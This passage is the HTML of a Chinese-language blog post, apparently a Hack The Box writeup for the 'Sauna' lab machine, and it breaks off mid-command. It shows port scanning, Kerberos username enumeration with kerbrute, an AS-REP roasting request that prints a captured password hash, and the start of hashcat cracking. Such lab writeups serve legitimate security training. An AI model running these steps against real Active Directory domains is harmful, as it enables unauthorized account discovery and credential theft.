@@ -1,0 +1,804 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：username-anarchy、网页用户名、kerbrute、域用户枚举、AsRepRoasting、hashcat、注册表内某个参数默认密码、kerberoasting、bloodhund、DCsync攻击">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sauna-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2024/05/10/Sauna-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：username-anarchy、网页用户名、kerbrute、域用户枚举、AsRepRoasting、hashcat、注册表内某个参数默认密码、kerberoasting、bloodhund、DCsync攻击">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Sauna-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Sauna-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Sauna-htb-writeup/3.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Sauna-htb-writeup/4.png">
+<meta property="article:published_time" content="2024-05-10T15:50:55.000Z">
+<meta property="article:modified_time" content="2024-05-14T12:27:42.080Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Sauna-htb-writeup/1.png">
+  
+  
+  
+  <title>Sauna-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
+                    
+                    <span>简易反弹shell集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Sauna-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-05-10 23:50" pubdate>
+          2024年5月10日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          29k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          239 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Sauna-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：username-anarchy、网页用户名、kerbrute、域用户枚举、AsRepRoasting、hashcat、注册表内某个参数默认密码、kerberoasting、bloodhund、DCsync攻击</p>
+<span id="more"></span>  
+
+<p>参考链接：<code>官方引导模式提示信息</code></p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：10.10.10.175</p>
+<p>2、获取下开放端口情况：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p- --min-rate=<span class="hljs-number">10000</span> -oG allports <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.175</span><br>[sudo] kali 的密码：<br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-05-10 00:09 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.175</span><br>Host is up (<span class="hljs-number">0.14</span>s latency).<br>Not shown: <span class="hljs-number">65515</span> filtered tcp ports (no-response)<br>PORT      STATE SERVICE<br><span class="hljs-number">53</span>/tcp    open  domain<br><span class="hljs-number">80</span>/tcp    open  http<br><span class="hljs-number">88</span>/tcp    open  kerberos-sec<br><span class="hljs-number">135</span>/tcp   open  msrpc<br><span class="hljs-number">139</span>/tcp   open  netbios-ssn<br><span class="hljs-number">389</span>/tcp   open  ldap<br><span class="hljs-number">445</span>/tcp   open  microsoft-ds<br><span class="hljs-number">464</span>/tcp   open  kpasswd5<br><span class="hljs-number">593</span>/tcp   open  http-rpc-epmap<br><span class="hljs-number">636</span>/tcp   open  ldapssl<br><span class="hljs-number">3268</span>/tcp  open  globalcatLDAP<br><span class="hljs-number">3269</span>/tcp  open  globalcatLDAPssl<br><span class="hljs-number">5985</span>/tcp  open  wsman<br><span class="hljs-number">9389</span>/tcp  open  adws<br><span class="hljs-number">49667</span>/tcp open  unknown<br><span class="hljs-number">49675</span>/tcp open  unknown<br><span class="hljs-number">49676</span>/tcp open  unknown<br><span class="hljs-number">49677</span>/tcp open  unknown<br><span class="hljs-number">49749</span>/tcp open  unknown<br><span class="hljs-number">49772</span>/tcp open  unknown<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">20.68</span> seconds<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ grep -oP <span class="hljs-string">&#x27;([0-9]+/open)&#x27;</span> allports | awk -F/ <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | tr <span class="hljs-string">&#x27;\n&#x27;</span> <span class="hljs-string">&#x27;,&#x27;</span><br><span class="hljs-number">53</span>,<span class="hljs-number">80</span>,<span class="hljs-number">88</span>,<span class="hljs-number">135</span>,<span class="hljs-number">139</span>,<span class="hljs-number">389</span>,<span class="hljs-number">445</span>,<span class="hljs-number">464</span>,<span class="hljs-number">593</span>,<span class="hljs-number">636</span>,<span class="hljs-number">3268</span>,<span class="hljs-number">3269</span>,<span class="hljs-number">5985</span>,<span class="hljs-number">9389</span>,<span class="hljs-number">49667</span>,<span class="hljs-number">49675</span>,<span class="hljs-number">49676</span>,<span class="hljs-number">49677</span>,<span class="hljs-number">49749</span>,<span class="hljs-number">49772</span>, <br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p53,<span class="hljs-number">80</span>,<span class="hljs-number">88</span>,<span class="hljs-number">135</span>,<span class="hljs-number">139</span>,<span class="hljs-number">389</span>,<span class="hljs-number">445</span>,<span class="hljs-number">464</span>,<span class="hljs-number">593</span>,<span class="hljs-number">636</span>,<span class="hljs-number">3268</span>,<span class="hljs-number">3269</span>,<span class="hljs-number">5985</span>,<span class="hljs-number">9389</span>,<span class="hljs-number">49667</span>,<span class="hljs-number">49675</span>,<span class="hljs-number">49676</span>,<span class="hljs-number">49677</span>,<span class="hljs-number">49749</span>,<span class="hljs-number">49772</span> -sC -sV --min-rate=<span class="hljs-number">10000</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.175</span>                                     <br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-05-10 00:13 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.175</span><br>Host is up (<span class="hljs-number">0.13</span>s latency).<br><br>PORT      STATE SERVICE       VERSION<br><span class="hljs-number">53</span>/tcp    open  domain        Simple DNS Plus<br><span class="hljs-number">80</span>/tcp    open  http          Microsoft IIS httpd <span class="hljs-number">10.0</span><br>|_http-title: Egotistical Bank :: Home<br>|_http-server-header: Microsoft-IIS/<span class="hljs-number">10.0</span><br>| http-methods: <br>|_  Potentially risky methods: TRACE<br><span class="hljs-number">88</span>/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: <span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-09</span> <span class="hljs-number">15</span>:<span class="hljs-number">09</span>:<span class="hljs-number">44</span>Z)<br><span class="hljs-number">135</span>/tcp   open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">139</span>/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br><span class="hljs-number">389</span>/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)<br><span class="hljs-number">445</span>/tcp   open  microsoft-ds?<br><span class="hljs-number">464</span>/tcp   open  kpasswd5?<br><span class="hljs-number">593</span>/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP <span class="hljs-number">1.0</span><br><span class="hljs-number">636</span>/tcp   open  tcpwrapped<br><span class="hljs-number">3268</span>/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)<br><span class="hljs-number">3269</span>/tcp  open  tcpwrapped<br><span class="hljs-number">5985</span>/tcp  open  http          Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/<span class="hljs-number">2.0</span><br>|_http-title: Not Found<br><span class="hljs-number">9389</span>/tcp  open  mc-nmf        .NET Message Framing<br><span class="hljs-number">49667</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49675</span>/tcp open  ncacn_http    Microsoft Windows RPC over HTTP <span class="hljs-number">1.0</span><br><span class="hljs-number">49676</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49677</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49749</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49772</span>/tcp open  msrpc         Microsoft Windows RPC<br>Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>|_clock-skew: <span class="hljs-number">-1</span>h03m25s<br>| smb2-time: <br>|   date: <span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-09</span>T15:<span class="hljs-number">10</span>:<span class="hljs-number">48</span><br>|_  start_date: N/A<br>| smb2-security-mode: <br>|   <span class="hljs-number">3</span>:<span class="hljs-number">1</span>:<span class="hljs-number">1</span>: <br>|_    Message signing enabled and required<br><br>Service detection performed. Please report any incorrect results at https:<span class="hljs-comment">//nmap.org/submit/ .</span><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">103.46</span> seconds<br></code></pre></td></tr></table></figure>
+
+<p>3、先看下80端口的情况吧</p>
+<p><code>http://10.10.10.175/</code></p>
+<p><img src="http://sh1yan.top/photo/Sauna-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>http://10.10.10.175/single.html</code></p>
+<p><img src="http://sh1yan.top/photo/Sauna-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">Jenny Joy<br>James Doe<br>Johnson<br>Watson<br></code></pre></td></tr></table></figure>
+
+<p><code>http://10.10.10.175/about.html</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">Fergus Smith<br>Hugo Bear<br>Steven Kerb<br>Shaun Coins<br>Bowie Taylor<br>Sophie Driver<br></code></pre></td></tr></table></figure>
+
+<p><code>http://10.10.10.175/contact.html</code></p>
+<p><img src="http://sh1yan.top/photo/Sauna-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>4、通过网上面，我们发现了一些用户名，先留着后续使用，我们先绑定下本地hosts信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ echo <span class="hljs-string">&quot;10.10.10.175 EGOTISTICAL-BANK.LOCAL&quot;</span> | sudo tee -a /etc/hosts<br>[sudo] kali 的密码：<br><span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.175</span> EGOTISTICAL-BANK.LOCAL<br></code></pre></td></tr></table></figure>
+
+<p>5、当我们拥有一些默认的用户名后，我们可以使用 username-anarchy 工具，再多关联一下用户，进行账号格式的组合。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">shiyan@InfoSec username-anarchy % ./username-anarchy -i ./name.txt<br>jenny<br>jennyjoy<br>jenny.joy<br>jennjoy<br>......<br>fergussmith<br>fergus.smith<br>fergussm<br>fergsmit<br>ferguss<br>f.smith<br>fsmith<br>sfergus<br>s.fergus<br>......<br>driver.s<br>driver.sophie<br>sd<br>shiyan@InfoSec username-anarchy %<br></code></pre></td></tr></table></figure>
+
+<p>6、然后我们使用 kerbrute 工具枚举下，看看哪些账号是在域中是存活的账号</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop/tools]<br>└─$ ./kerbrute userenum -d egotistical-bank.local --dc <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.175</span> ../<span class="hljs-built_in">list</span>.txt <br><br>    __             __               __     <br>   / /_____  _____/ /_  _______  __/ /____ <br>  / <span class="hljs-comment">//_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="hljs-comment"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br>/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        <br><br>Version: dev (n/a) - <span class="hljs-number">05</span>/<span class="hljs-number">10</span>/<span class="hljs-number">24</span> - Ronnie Flathers @ropnop<br><br><span class="hljs-number">2024</span>/<span class="hljs-number">05</span>/<span class="hljs-number">10</span> <span class="hljs-number">02</span>:<span class="hljs-number">20</span>:<span class="hljs-number">19</span> &gt;  Using <span class="hljs-title function_">KDC</span><span class="hljs-params">(s)</span>:<br>2024/05/10 02:20:19 &gt;   10.10.10.175:88<br><br>2024/05/10 02:20:20 &gt;  [+] VALID USERNAME:       fsmith@egotistical-bank.local<br>2024/05/10 02:20:20 &gt;  Done! Tested 116 <span class="hljs-title function_">usernames</span> <span class="hljs-params">(<span class="hljs-number">1</span> valid)</span> in 1.019 seconds<br></code></pre></td></tr></table></figure>
+
+<p>7、我去，那么多账号，就这一个账号存活，开始尝试下，是否存在as-reproasting漏洞吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ impacket-GetNPUsers -format hashcat -dc-ip <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.175</span> -request <span class="hljs-string">&#x27;egotistical-bank.local/fsmith&#x27;</span> -no-pass <br>Impacket v0<span class="hljs-number">.11</span><span class="hljs-number">.0</span> - Copyright <span class="hljs-number">2023</span> Fortra<br><br>[*] Getting TGT <span class="hljs-keyword">for</span> fsmith<br>$krb5asrep$<span class="hljs-number">23</span>$fsmith@EGOTISTICAL-BANK.LOCAL:<span class="hljs-number">0</span>a556391e31d0d84bd6368c3dc76808e$<span class="hljs-number">5b</span>2fe3ca4b7847e0e51e157fdbe399f70583e42c31e08165f461a2ab61d33a56342fb009cf78d62cf5daf8600fc6c65ac2c5e4b74181ddadca8762f552037edbc8821243273247ef9189f734f266db2ce218da518fd8153c4e302cad8a93b960f595425c340f9e0facc109e5a0f09ef924ae2901daacb70154da8944b5c420dba0aecacefde66d6a6ac94229d37d34778fb6b0b29e4fd1b37faed9bd7bba7abc36d52c9476bfacc943da287231e827d9792e6028b90602fff3f0846a2f7a5c701a90f54b3ff698deb2152953e01eaebec97b968946aaefbde4fcbae037f219cf590083a6a8d95caad6fbee598393259f6041919731796361ed8076f1cf76d1b7<br></code></pre></td></tr></table></figure>
+
+<p>8、那就开始破解下哈希值吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ touch hash <br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ hashcat -h | grep -i <span class="hljs-string">&quot;kerberos&quot;</span><br>  <span class="hljs-number">19600</span> | Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">17</span>, TGS-REP                              | Network Protocol<br>  <span class="hljs-number">19800</span> | Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">17</span>, Pre-Auth                             | Network Protocol<br>  <span class="hljs-number">28800</span> | Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">17</span>, DB                                   | Network Protocol<br>  <span class="hljs-number">19700</span> | Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">18</span>, TGS-REP                              | Network Protocol<br>  <span class="hljs-number">19900</span> | Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">18</span>, Pre-Auth                             | Network Protocol<br>  <span class="hljs-number">28900</span> | Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">18</span>, DB                                   | Network Protocol<br>   <span class="hljs-number">7500</span> | Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">23</span>, AS-REQ Pre-Auth                      | Network Protocol<br>  <span class="hljs-number">13100</span> | Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">23</span>, TGS-REP                              | Network Protocol<br>  <span class="hljs-number">18200</span> | Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">23</span>, AS-REP                               | Network Protocol<br>                                                                                                            <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo hashcat -m <span class="hljs-number">18200</span> ./hash 